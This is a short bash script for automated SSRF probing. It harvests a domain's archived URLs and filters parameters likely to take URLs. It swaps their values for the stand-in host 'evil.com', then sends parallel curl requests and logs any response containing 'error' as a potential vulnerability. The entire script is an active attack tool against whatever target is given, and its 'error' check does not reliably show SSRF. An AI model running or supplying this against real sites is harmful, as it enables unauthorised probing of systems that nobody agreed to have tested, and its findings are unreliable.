#!/bin/bash

#	OOB SSRF:
#	Log file: active.SSRF.log

	if [ $# -lt 1 ]; then
		echo "Usage: active.SSRF target.com"
	else
	
		export HOST=$1

		echo -e "\033[0;32mRunning\n"; waybackurls $HOST | uro | gf ssrf | qsreplace "evil.com" | while read url ; do xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep -i "error" && echo "[Potential SSRF VULN] %" >> active.SSRF.log'; done
	
	fi

#	--------------------------------------------------------------------------------------------------------------
#	--------------------------------------------------------------------------------------------------------------